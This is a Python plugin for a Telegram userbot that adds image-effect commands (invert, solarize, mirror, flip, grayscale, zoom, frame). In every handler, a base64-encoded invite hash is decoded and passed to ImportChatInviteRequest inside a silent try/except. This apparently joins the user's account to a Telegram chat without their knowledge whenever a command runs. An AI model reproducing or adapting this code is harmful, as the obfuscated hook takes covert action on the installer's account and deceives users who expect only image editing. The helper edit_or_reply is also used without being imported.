import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from W2HBOT.utils import admin_cmd, sudo_cmd
from userbot import CmdHelp, CMD_HELP, LOGS, bot as W2HBOT
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@W2HBOT.on(admin_cmd(pattern="invert$", outgoing=True))
@W2HBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(W2H):
    if W2H.fwd_from:
        return
    reply = await W2H.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(W2H, "`Reply to supported Media...`")
        return
    W2Hid = W2H.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    W2H = await edit_or_reply(W2H, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    W2Hsticker = await reply.download_media(file="./temp/")
    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(W2Hsticker)
        await edit_or_reply(W2H, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if W2Hsticker.endswith(".tgs"):
        await W2H.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        W2Hfile = os.path.join("./temp/", "meme.png")
        W2Hcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
        )
        stdout, stderr = (await runcmd(W2Hcmd))[:2]
        if not os.path.lexists(W2Hfile):
            await W2H.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = W2Hfile
        aura = True
    elif W2Hsticker.endswith(".webp"):
        await W2H.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        W2Hfile = os.path.join("./temp/", "memes.jpg")
        os.rename(W2Hsticker, W2Hfile)
        if not os.path.lexists(W2Hfile):
            await W2H.edit("`Template not found... `")
            return
        meme_file = W2Hfile
        aura = True
    elif W2Hsticker.endswith((".mp4", ".mov")):
        await W2H.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        W2Hfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(W2Hsticker, 0, W2Hfile)
        if not os.path.lexists(W2Hfile):
            await W2H.edit("```Template not found...```")
            return
        meme_file = W2Hfile
        aura = True
    else:
        await W2H.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = W2Hsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await W2H.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if aura else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await W2H.client.send_file(
        W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
    )
    await W2H.delete()
    os.remove(outputfile)
    for files in (W2Hsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@W2HBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
@W2HBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(W2H):
    if W2H.fwd_from:
        return
    reply = await W2H.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(W2H, "`Reply to supported Media...`")
        return
    W2Hid = W2H.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    W2H = await edit_or_reply(W2H, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    W2Hsticker = await reply.download_media(file="./temp/")
    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(W2Hsticker)
        await edit_or_reply(W2H, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if W2Hsticker.endswith(".tgs"):
        await W2H.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        W2Hfile = os.path.join("./temp/", "meme.png")
        W2Hcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
        )
        stdout, stderr = (await runcmd(W2Hcmd))[:2]
        if not os.path.lexists(W2Hfile):
            await W2H.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = W2Hfile
        aura = True
    elif W2Hsticker.endswith(".webp"):
        await W2H.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        W2Hfile = os.path.join("./temp/", "memes.jpg")
        os.rename(W2Hsticker, W2Hfile)
        if not os.path.lexists(W2Hfile):
            await W2H.edit("`Template not found... `")
            return
        meme_file = W2Hfile
        aura = True
    elif W2Hsticker.endswith((".mp4", ".mov")):
        await W2H.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        W2Hfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(W2Hsticker, 0, W2Hfile)
        if not os.path.lexists(W2Hfile):
            await W2H.edit("```Template not found...```")
            return
        meme_file = W2Hfile
        aura = True
    else:
        await W2H.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = W2Hsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await W2H.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if aura else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await W2H.client.send_file(
        W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
    )
    await W2H.delete()
    os.remove(outputfile)
    for files in (W2Hsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@W2HBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
@W2HBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(W2H):
    if W2H.fwd_from:
        return
    reply = await W2H.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(W2H, "`Reply to supported Media...`")
        return
    W2Hid = W2H.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    W2H = await edit_or_reply(W2H, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    W2Hsticker = await reply.download_media(file="./temp/")
    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(W2Hsticker)
        await edit_or_reply(W2H, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if W2Hsticker.endswith(".tgs"):
        await W2H.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        W2Hfile = os.path.join("./temp/", "meme.png")
        W2Hcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
        )
        stdout, stderr = (await runcmd(W2Hcmd))[:2]
        if not os.path.lexists(W2Hfile):
            await W2H.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = W2Hfile
        aura = True
    elif W2Hsticker.endswith(".webp"):
        await W2H.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        W2Hfile = os.path.join("./temp/", "memes.jpg")
        os.rename(W2Hsticker, W2Hfile)
        if not os.path.lexists(W2Hfile):
            await W2H.edit("`Template not found... `")
            return
        meme_file = W2Hfile
        aura = True
    elif W2Hsticker.endswith((".mp4", ".mov")):
        await W2H.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        W2Hfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(W2Hsticker, 0, W2Hfile)
        if not os.path.lexists(W2Hfile):
            await W2H.edit("```Template not found...```")
            return
        meme_file = W2Hfile
        aura = True
    else:
        await W2H.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = W2Hsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await W2H.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if aura else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await W2H.client.send_file(
        W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
    )
    await W2H.delete()
    os.remove(outputfile)
    for files in (W2Hsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@W2HBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
@W2HBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(W2H):
    if W2H.fwd_from:
        return
    reply = await W2H.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(W2H, "`Reply to supported Media...`")
        return
    W2Hid = W2H.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    W2H = await edit_or_reply(W2H, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    W2Hsticker = await reply.download_media(file="./temp/")
    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(W2Hsticker)
        await edit_or_reply(W2H, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if W2Hsticker.endswith(".tgs"):
        await W2H.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        W2Hfile = os.path.join("./temp/", "meme.png")
        W2Hcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
        )
        stdout, stderr = (await runcmd(W2Hcmd))[:2]
        if not os.path.lexists(W2Hfile):
            await W2H.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = W2Hfile
        aura = True
    elif W2Hsticker.endswith(".webp"):
        await W2H.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        W2Hfile = os.path.join("./temp/", "memes.jpg")
        os.rename(W2Hsticker, W2Hfile)
        if not os.path.lexists(W2Hfile):
            await W2H.edit("`Template not found... `")
            return
        meme_file = W2Hfile
        aura = True
    elif W2Hsticker.endswith((".mp4", ".mov")):
        await W2H.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        W2Hfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(W2Hsticker, 0, W2Hfile)
        if not os.path.lexists(W2Hfile):
            await W2H.edit("```Template not found...```")
            return
        meme_file = W2Hfile
        aura = True
    else:
        await W2H.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = W2Hsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await W2H.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if aura else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await W2H.client.send_file(
        W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
    )
    await W2H.delete()
    os.remove(outputfile)
    for files in (W2Hsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@W2HBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
@W2HBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(W2H):
    if W2H.fwd_from:
        return
    reply = await W2H.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(W2H, "`Reply to supported Media...`")
        return
    W2Hid = W2H.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    W2H = await edit_or_reply(W2H, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    W2Hsticker = await reply.download_media(file="./temp/")
    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(W2Hsticker)
        await edit_or_reply(W2H, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if W2Hsticker.endswith(".tgs"):
        await W2H.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        W2Hfile = os.path.join("./temp/", "meme.png")
        W2Hcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
        )
        stdout, stderr = (await runcmd(W2Hcmd))[:2]
        if not os.path.lexists(W2Hfile):
            await W2H.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = W2Hfile
        aura = True
    elif W2Hsticker.endswith(".webp"):
        await W2H.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        W2Hfile = os.path.join("./temp/", "memes.jpg")
        os.rename(W2Hsticker, W2Hfile)
        if not os.path.lexists(W2Hfile):
            await W2H.edit("`Template not found... `")
            return
        meme_file = W2Hfile
        aura = True
    elif W2Hsticker.endswith((".mp4", ".mov")):
        await W2H.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        W2Hfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(W2Hsticker, 0, W2Hfile)
        if not os.path.lexists(W2Hfile):
            await W2H.edit("```Template not found...```")
            return
        meme_file = W2Hfile
        aura = True
    else:
        await W2H.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = W2Hsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await W2H.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await W2H.client.send_file(
        W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
    )
    await W2H.delete()
    os.remove(outputfile)
    for files in (W2Hsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@W2HBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@W2HBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(W2H):
    if W2H.fwd_from:
        return
    reply = await W2H.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(W2H, "`Reply to supported Media...`")
        return
    W2Hinput = W2H.pattern_match.group(1)
    W2Hinput = 50 if not W2Hinput else int(W2Hinput)
    W2Hid = W2H.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    W2H = await edit_or_reply(W2H, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    W2Hsticker = await reply.download_media(file="./temp/")
    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(W2Hsticker)
        await edit_or_reply(W2H, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if W2Hsticker.endswith(".tgs"):
        await W2H.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        W2Hfile = os.path.join("./temp/", "meme.png")
        W2Hcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
        )
        stdout, stderr = (await runcmd(W2Hcmd))[:2]
        if not os.path.lexists(W2Hfile):
            await W2H.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = W2Hfile
        aura = True
    elif W2Hsticker.endswith(".webp"):
        await W2H.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        W2Hfile = os.path.join("./temp/", "memes.jpg")
        os.rename(W2Hsticker, W2Hfile)
        if not os.path.lexists(W2Hfile):
            await W2H.edit("`Template not found... `")
            return
        meme_file = W2Hfile
        aura = True
    elif W2Hsticker.endswith((".mp4", ".mov")):
        await W2H.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        W2Hfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(W2Hsticker, 0, W2Hfile)
        if not os.path.lexists(W2Hfile):
            await W2H.edit("```Template not found...```")
            return
        meme_file = W2Hfile
    else:
        await W2H.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = W2Hsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await W2H.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, W2Hinput)
    except Exception as e:
        return await W2H.edit(f"`{e}`")
    try:
        await W2H.client.send_file(
            W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
        )
    except Exception as e:
        return await W2H.edit(f"`{e}`")
    await W2H.delete()
    os.remove(outputfile)
    for files in (W2Hsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@W2HBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@W2HBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(W2H):
    if W2H.fwd_from:
        return
    reply = await W2H.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(W2H, "`Reply to supported Media...`")
        return
    W2Hinput = W2H.pattern_match.group(1)
    if not W2Hinput:
        W2Hinput = 50
    if ";" in str(W2Hinput):
        W2Hinput, colr = W2Hinput.split(";", 1)
    else:
        colr = 0
    W2Hinput = int(W2Hinput)
    colr = int(colr)
    W2Hid = W2H.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    W2H = await edit_or_reply(W2H, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    W2Hsticker = await reply.download_media(file="./temp/")
    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(W2Hsticker)
        await edit_or_reply(W2H, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if W2Hsticker.endswith(".tgs"):
        await W2H.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        W2Hfile = os.path.join("./temp/", "meme.png")
        W2Hcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
        )
        stdout, stderr = (await runcmd(W2Hcmd))[:2]
        if not os.path.lexists(W2Hfile):
            await W2H.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = W2Hfile
        aura = True
    elif W2Hsticker.endswith(".webp"):
        await W2H.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        W2Hfile = os.path.join("./temp/", "memes.jpg")
        os.rename(W2Hsticker, W2Hfile)
        if not os.path.lexists(W2Hfile):
            await W2H.edit("`Template not found... `")
            return
        meme_file = W2Hfile
        aura = True
    elif W2Hsticker.endswith((".mp4", ".mov")):
        await W2H.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        W2Hfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(W2Hsticker, 0, W2Hfile)
        if not os.path.lexists(W2Hfile):
            await W2H.edit("```Template not found...```")
            return
        meme_file = W2Hfile
    else:
        await W2H.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = W2Hsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await W2H.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if aura else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, W2Hinput, colr)
    except Exception as e:
        return await W2H.edit(f"`{e}`")
    try:
        await W2H.client.send_file(
            W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
        )
    except Exception as e:
        return await W2H.edit(f"`{e}`")
    await W2H.delete()
    os.remove(outputfile)
    for files in (W2Hsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()